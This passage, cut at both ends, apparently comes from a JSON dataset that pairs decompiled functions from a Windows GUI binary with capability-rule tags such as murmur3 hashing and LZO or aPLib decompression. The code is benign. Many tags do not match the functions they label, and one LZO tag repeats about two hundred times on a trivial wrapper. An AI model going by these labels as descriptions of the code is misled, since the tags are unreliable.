*arg_8h_00 = uVar3;\n            if (uVar3 < 0) {\n                *arg_8h_00 = uVar3 + 0x3c;\n                bVar4 = 0x3b < var_8h;\n                var_8h = var_8h - 0x3c;\n                var_4h = var_4h + -1 + bVar4;\n            }\n            _var_8h = fcn.0040d140(var_8h, var_4h, 0x3c, 0);\n            _var_8h = _var_8h + arg_8h_00[1];\n            uVar3 = fcn.004135b0(_var_8h, 0x3c, 0);\n            arg_8h_00[1] = uVar3;\n            if (uVar3 < 0) {\n                arg_8h_00[1] = uVar3 + 0x3c;\n                _var_8h = _var_8h + -0x3c;\n            }\n            iVar5 = fcn.0040d140(_var_8h, 0x3c, 0);\n            _var_8h = iVar5 + arg_8h_00[2];\n            uVar3 = fcn.004135b0(_var_8h, 0x18, 0);\n            arg_8h_00[2] = uVar3;\n            if (uVar3 < 0) {\n                arg_8h_00[2] = uVar3 + 0x18;\n                _var_8h = _var_8h + -0x18;\n            }\n            iVar5 = fcn.0040d140(_var_8h, 0x18, 0);\n            iVar1 = iVar5;\n            if ((iVar5 < 0x100000000) && (iVar5 < 0)) {\n                arg_8h_00[6] = (arg_8h_00[6] + 7 + iVar1) % 7;\n                arg_8h_00[3] = arg_8h_00[3] + iVar1;\n                if (arg_8h_00[3] < 1) {\n                    arg_8h_00[5] = arg_8h_00[5] - 1;\n                    arg_8h_00[3] = arg_8h_00[3] + 0x1f;\n                    arg_8h_00[7] = 0x16c;\n                    arg_8h_00[4] = 0xb;\n                }\n                else {\n                    arg_8h_00[7] = arg_8h_00[7] + iVar1;\n                }\n            }\n        }\n        else {\n            var_8h = uVar2 - *0x44e698;\n            var_4h = (uVar3 - (*0x44e698 >> 0x1f)) - (uVar2 < *0x44e698);\n            arg_8h_00 = fcn.00412d18(&var_8h);\n            if ((*0x44e69c != 0) && (iVar1 = fcn.00413570(arg_8h_00),  iVar1 != 0)) {\n                bVar4 = var_8h < *0x44e6a0;\n                var_8h = var_8h - *0x44e6a0;\n                var_4h = (var_4h - (*0x44e6a0 >> 0x1f)) - bVar4;\n                arg_8h_00 = fcn.00412d18(&var_8h);\n                arg_8h_00[8] = 1;\n            }\n        }\n    }\n    return arg_8h_00;\n}\n",
        "token_count": 1360
    },
    "00408a19": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nint32_t * __cdecl\nfcn.00408a19(int32_t *arg_8h, uint lpString, uint chCount, uint nTabPositions, uint lpnTabStopPositions)\n\n{\n    uint uVar1;\n    int32_t in_ECX;\n    \n    uVar1 = (*_sym.imp.USER32.dll_GetTabbedTextExtentA)\n                      (*(in_ECX + 8), lpString, chCount, nTabPositions, lpnTabStopPositions);\n    arg_8h[1] = uVar1 >> 0x10;\n    *arg_8h = uVar1;\n    return arg_8h;\n}\n",
        "token_count": 140
    },
    "0041a211": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041a211(int32_t arg_8h, uint32_t arg_ch, uint arg_10h, uint32_t arg_14h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    \n    if (arg_8h == 0) {\n        uVar2 = 0;\n    }\n    else {\n        iVar3 = fcn.00437973(0x434c5a);\n        if ((*(iVar3 + 0x18) != 0) && (iVar4 = fcn.0041eede(arg_8h),  iVar4 == 0)) {\n            fcn.0041fb4c(arg_8h);\n            *(iVar3 + 0x18) = 0;\n        }\n        pcVar1 = _sym.imp.USER32.dll_RegisterWindowMessageA;\n        if (arg_ch == 0x110) {\n            *0x450fe4 = (*_sym.imp.USER32.dll_RegisterWindowMessageA)(\"commdlg_LBSelChangedNotify\");\n            *0x450fe8 = (*pcVar1)(\"commdlg_ShareViolation\");\n            *0x450fec = (*pcVar1)(\"commdlg_FileNameOK\");\n            *0x450ff0 = (*pcVar1)(\"commdlg_ColorOK\");\n            *0x450ff4 = (*pcVar1)(\"commdlg_help\");\n            *0x450ff8 = (*pcVar1)(\"commdlg_SetRGBColor\");\n            uVar2 = fcn.0041c23a(arg_8h, 0x110, arg_10h, arg_14h);\n        }\n        else if ((arg_ch == *0x450ff4) || ((arg_ch == 0x111 && (arg_10h == 0x40e)))) {\n            (*_sym.imp.USER32.dll_SendMessageA)(arg_8h, 0x111, 0xe146, 0);\n            uVar2 = 1;\n        }\n        else {\n            if (0xbfff < arg_ch) {\n                piVar5 = fcn.0041eede(arg_8h);\n                iVar3 = fcn.0041bb59(0x442f90);\n                if ((iVar3 == 0) || (iVar3 = fcn.00419cf7(),  (*(iVar3 + 0x36) & 8) == 0)) {\n                    if (arg_ch == *0x450fe8) {\n                        uVar2 = (**(*piVar5 + 0x158))(arg_14h);\n                        return uVar2;\n                    }\n                    if (arg_ch == *0x450fec) {\n                        piVar5[0x70] = arg_14h;\n                        uVar2 = (**(*piVar5 + 0x15c))();\n                        piVar5[0x70] = 0;\n                        return uVar2;\n                    }\n                    if (arg_ch == *0x450fe4) {\n                        (**(*piVar5 + 0x160))(arg_10h, arg_14h & 0xffff, arg_14h >> 0x10);\n                    }\n                    else if (arg_ch == *0x450ff0) {\n                        uVar2 = (**(*piVar5 + 0x158))();\n                        return uVar2;\n                    }\n                }\n            }\n            uVar2 = 0;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 771
    },
    "0041eddf": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nint32_t fcn.0041eddf(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = fcn.00437973(0x434c5a);\n    uVar2 = (*_sym.imp.USER32.dll_GetMessageTime)();\n    *(iVar1 + 0x68) = uVar2;\n    uVar2 = (*_sym.imp.USER32.dll_GetMessagePos)();\n    *(iVar1 + 0x70) = uVar2 >> 0x10;\n    *(iVar1 + 0x6c) = uVar2;\n    return iVar1 + 0x58;\n}\n",
        "token_count": 140
    },
    "0041fce9": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041fce9(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    uint32_t uVar3;\n    uint var_2ch;\n    uint32_t var_28h;\n    int32_t var_4h;\n    \n    uVar3 = arg_8h & 0xffff;\n    arg_8h = arg_8h >> 0x10;\n    if (arg_ch == 0) {\n        if (uVar3 == 0) {\n            return 0;\n        }\n        fcn.0041db21();\n        var_28h = uVar3;\n        (**(*in_ECX + 0xc))(uVar3, 0xffffffff, &var_2ch, 0);\n        if (var_4h != 0) {\n            arg_8h = 0;\ncode_r0x0041fd2d:\n            uVar1 = (**(*in_ECX + 0xc))(uVar3, arg_8h, 0, 0);\n            return uVar1;\n        }\n    }\n    else {\n        iVar2 = fcn.00437973(0x434c5a);\n        if ((*(iVar2 + 0xdc) != in_ECX[7]) && (iVar2 = fcn.0041f935(arg_ch, 0),  iVar2 == 0)) {\n            if (uVar3 == 0) {\n                return 0;\n            }\n            goto code_r0x0041fd2d;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 363
    },
    "00420d20": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498",
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498",
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00420d20(uint32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, int32_t *arg_14h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_ch;\n    int32_t *var_8h;\n    int32_t var_4h;\n    \n    if (arg_8h < 0x112) {\n        if (arg_8h == 0x111) {\n            iVar2 = fcn.0041be83(0, arg_ch >> 0x10 | 0xbd110000, 0, 0);\n            if (iVar2 == 0) {\n                return 0;\n            }\n            if (arg_14h != NULL) {\n                *arg_14h = 1;\n                return 1;\n            }\n            return 1;\n        }\n        if (0x2a < arg_8h) {\n            if ((arg_8h < 0x30) || (arg_8h == 0x39)) goto code_r0x00420db4;\n            if (arg_8h == 0x4e) {\n                var_8h = arg_14h;\n                var_4h = arg_10h;\n                uVar1 = fcn.0041be83(0, *(arg_10h + 8) & 0xffff | 0xbc4e0000, &var_8h, 0);\n                return uVar1;\n            }\n        }\n    }\n    else if ((0x113 < arg_8h) && ((arg_8h < 0x116 || (arg_8h == 0x210)))) {\ncode_r0x00420db4:\n        uVar1 = fcn.00420715(arg_8h + 0xbc00, arg_ch, arg_10h, arg_14h);\n        return uVar1;\n    }\n    if ((0x131 < arg_8h) && (arg_8h < 0x139)) {\n        var_4h = arg_8h - 0x132;\n        var_8h = arg_ch;\n        uVar1 = fcn.00420715(0xbc19, 0, &var_ch, arg_14h);\n        if (*arg_14h != 0) {\n            return uVar1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 533
    },
    "00428178": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00428178(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t in_ECX;\n    uint var_18h;\n    char var_10h;\n    uint var_fh;\n    uint var_4h;\n    \n    var_4h = *0x44e0fc;\n    fcn.00427d22(arg_8h, &var_18h);\n    cVar1 = arg_ch >> 0x10;\n    if ((var_fh != arg_ch) || (var_10h != cVar1)) {\n        var_10h = cVar1;\n        var_fh._0_1_ = arg_ch;\n        fcn.00427ffb(arg_8h, &var_18h);\n        *(in_ECX + 0x9c) = 1;\n    }\n    fcn.0040b5c2();\n    return;\n}\n",
        "token_count": 212
    },
    "00428603": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00428603(int32_t *arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint uVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    iVar3 = 0;\n    uVar2 = 0;\n    if (0x40046 < *0x44da60) {\n        uVar2 = fcn.0041cced();\n        iVar3 = fcn.0041cd21(0, 0x8800, 0);\n    }\n    iVar1 = fcn.0041ee14();\n    if (iVar1 != 0) {\n        *arg_8h = arg_ch;\n        arg_8h[1] = arg_ch >> 0x10;\n    }\n    if (iVar3 != 0) {\n        (*_sym.imp.USER32.dll_SetWindowLongA)(*(in_ECX + 0x1c), 0xfffffff0, uVar2);\n    }\n    return iVar1;\n}\n",
        "token_count": 234
    },
    "00435102": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nvoid fcn.00435102(void)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    uchar *puVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iStack148;\n    int32_t iStack144;\n    uint8_t *puStack140;\n    uchar auStack136 [128];\n    uint uStack8;\n    \n    uStack8 = *0x44e0fc;\n    uVar2 = (*_sym.imp.USER32.dll_GetMenuCheckMarkDimensions)();\n    iVar5 = uVar2;\n    iStack148 = uVar2 >> 0x10;\n    if (0x20 < iVar5) {\n        iVar5 = 0x20;\n    }\n    iVar6 = iVar5 + 0xf >> 4;\n    iVar7 = ((iVar5 + -4) / 2 + iVar6 * 0x10) - iVar5;\n    if (0xc < iVar7) {\n        iVar7 = 0xc;\n    }\n    if (0x20 < iStack148) {\n        iStack148 = 0x20;\n    }\n    fcn.0040bbe0(auStack136, 0xff, 0x80);\n    puVar4 = auStack136 + (iStack148 + -6 >> 1) * iVar6 * 2;\n    puStack140 = 0x43f070;\n    iStack144 = 5;\n    do {\n        uVar1 = *puStack140;\n        uVar3 = puStack140 & 0xffff0000;\n        puStack140 = puStack140 + 1;\n        uVar3 = ~((uVar3 | uVar1) << (iVar7 & 0x1f));\n        *puVar4 = uVar3 >> 8;\n        puVar4[1] = uVar3;\n        puVar4 = puVar4 + iVar6 * 2;\n        iStack144 = iStack144 + -1;\n    } while (iStack144 != 0);\n    *0x450d88 = (*_sym.imp.GDI32.dll_CreateBitmap)(iVar5, iStack148, 1, 1, auStack136);\n    if (*0x450d88 == 0) {\n        *0x450d88 = (*_sym.imp.USER32.dll_LoadBitmapA)(0, 0x7fe3);\n    }\n    fcn.0040b5c2();\n    return;\n}\n",
        "token_count": 553
    },
    "0040c86b": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x0040c8fd: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x0040c902)\n// WARNING: Removing unreachable block (ram,0x0040c928)\n// WARNING: Removing unreachable block (ram,0x0040c907)\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040c86b(uint uExitCode, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    uint var_4h;\n    \n    fcn.0040bc40(0x443330, 8);\n    fcn.0040d40a(8);\n    *(unaff_EBP + -4) = 0;\n    if (*0x45105c == 1) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(*(unaff_EBP + 8));\n        (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar1);\n    }\n    *0x451058 = 1;\n    *0x451054 = *(unaff_EBP + 0x10);\n    if (*(unaff_EBP + 0xc) == 0) {\n        if (*0x4527b4 != NULL) {\n            while( true ) {\n                *0x4527b0 = *0x4527b0 + -1;\n                if (*0x4527b0 < *0x4527b4) break;\n                if (**0x4527b0 != NULL) {\n                    (***0x4527b0)();\n                }\n            }\n        }\n        fcn.0040c7e9(0x44d0a4);\n    }\n    fcn.0040c7e9(0x44d0b0);\n    *(unaff_EBP + -4) = 0xffffffff;\n    if (*(unaff_EBP + 0x10) != 0) {\n        fcn.0040d355(8);\n    }\n    return;\n}\n",
        "token_count": 461
    },
    "00414fd5": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00414fd5(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    \n    puVar3 = param_1 + (param_2 / 0x20) * 4;\n    iVar1 = fcn.004166b5(*puVar3, 1 << (0x1fU - param_2 % 0x20 & 0x1f), puVar3);\n    iVar2 = param_2 / 0x20 + -1;\n    if (-1 < iVar2) {\n        puVar3 = param_1 + iVar2 * 4;\n        do {\n            if (iVar1 == 0) {\n                return;\n            }\n            iVar1 = fcn.004166b5(*puVar3, 1, puVar3);\n            iVar2 = iVar2 + -1;\n            puVar3 = puVar3 + -1;\n        } while (-1 < iVar2);\n    }\n    return;\n}\n",
        "token_count": 232
    },
    "0040a6a6": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040a6a6(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    uint var_4h;\n    \n    uVar1 = fcn.0040ea15(arg_8h, arg_ch, arg_10h, arg_14h, in_EAX, 0, 0, 0);\n    return uVar1;\n}\n",
        "token_count": 106
    },
    "0040d24c": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nuint8_t * __cdecl fcn.0040d24c(uint8_t *arg_8h, uint32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    uint8_t uVar4;\n    uint8_t *puVar5;\n    uint8_t *puVar6;\n    bool bVar7;\n    \n    puVar5 = NULL;\n    iVar3 = fcn.0040eadd();\n    iVar3 = *(iVar3 + 0x60);\n    if (iVar3 != *0x4527c0) {\n        iVar3 = fcn.0040bf99();\n    }\n    if (*(iVar3 + 8) != 0) {\n        do {\n            uVar4 = *arg_8h;\n            if ((*(uVar4 + 0x1d + iVar3) & 4) == 0) {\n                bVar7 = arg_ch == uVar4;\ncode_r0x0040d2a7:\n                puVar6 = arg_8h;\n                if (bVar7) {\n                    puVar5 = arg_8h;\n                }\n            }\n            else {\n                puVar6 = arg_8h + 1;\n                uVar1 = *puVar6;\n                if (uVar1 == 0) {\n                    bVar7 = puVar5 == NULL;\n                    arg_8h = puVar6;\n                    uVar4 = uVar1;\n                    goto code_r0x0040d2a7;\n                }\n                uVar2 = CONCAT11(uVar4, uVar1);\n                uVar4 = uVar1;\n                if (arg_ch == 